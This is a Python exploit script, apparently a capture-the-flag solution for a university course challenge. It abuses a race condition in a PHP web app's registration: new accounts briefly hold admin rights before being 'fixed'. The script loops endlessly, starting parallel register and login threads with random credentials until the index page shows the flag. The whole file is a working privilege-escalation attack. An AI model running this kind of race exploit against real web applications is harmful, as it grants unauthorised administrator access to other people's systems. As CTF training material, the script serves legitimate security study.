import requests
import string
import random
import sys
import threading
import time

'''
Using the class example as a basis,
On register, first the user is an admin and then gets "fixed", so we can register and login before this "fix" happens
Need to maintain the session between the login and the get to index.
Then search the returned index page for the flag.
'''

EP = "http://actf.jinblack.it:4007"

def rand_string(N=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=N))

def register(u,p):
    url = "%s/register.php" % EP
    data = {"username":u, "password_1": p, "password_2": p, "reg_user": "yep"}
    r = requests.post(url, data = data)
    #print(r.text)
    if "SUCCESS!" in r.text:
        return True
    return False

def login_and_check(u, p):
    url = "%s/login.php" % EP
    data = {"username":u, "password": p, "log_user": "yep"}
    s = requests.Session()
    r = s.post(url, data = data)
    #print(r.text)
	
    url = "%s/index.php" % EP
    r = s.get(url)
    #print(r.text)
    if "flag{" in r.text:
        print(r.text)
        sys.exit(0)

#url = "%s/index.php" % EP
#r = requests.get(url)
#print(r.text)
'''
u = rand_string()
p = rand_string()
register(u, p)
login_and_check(u, p)
'''

while True:
    u = rand_string()
    p = rand_string()

    r = threading.Thread(target=register, args=(u, p))
    r.start()

    l = threading.Thread(target=login_and_check, args=(u, p))
    l.start()

    time.sleep(0.1)

#flag{this_is_the_race_condition_flag}
